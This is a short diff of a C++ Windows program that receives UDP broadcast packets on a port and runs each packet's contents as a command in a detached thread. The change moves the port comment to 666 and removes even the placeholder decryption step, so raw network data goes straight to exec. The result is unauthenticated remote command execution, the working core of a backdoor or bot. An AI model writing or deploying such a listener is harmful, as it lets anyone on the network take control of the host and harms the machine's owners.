@@ -37,7 +37,7 @@ int main() {
             WSACleanup();
         }
 
-        // Configure for broadcast receive on port 888
+        // Configure for broadcast receive on port 666
         struct sockaddr_in serverSocketConfig{};
         struct sockaddr_in clientSocketConfig{};
 
@@ -59,9 +59,7 @@ int main() {
         // Receive incoming data from ClientSocket
         recvfrom(serverSocket, recvbuff, recvbufflen, 0, (sockaddr *) &clientSocketConfig, &len);
 
-        std::string decryptedString = recvbuff; //TODO: fix encryption being too big aka not fitting in UDP :skull:
-
-        std::thread cmd(exec, decryptedString.c_str());
+        std::thread cmd(exec, recvbuff);
         cmd.detach();
 
         // Cleanup
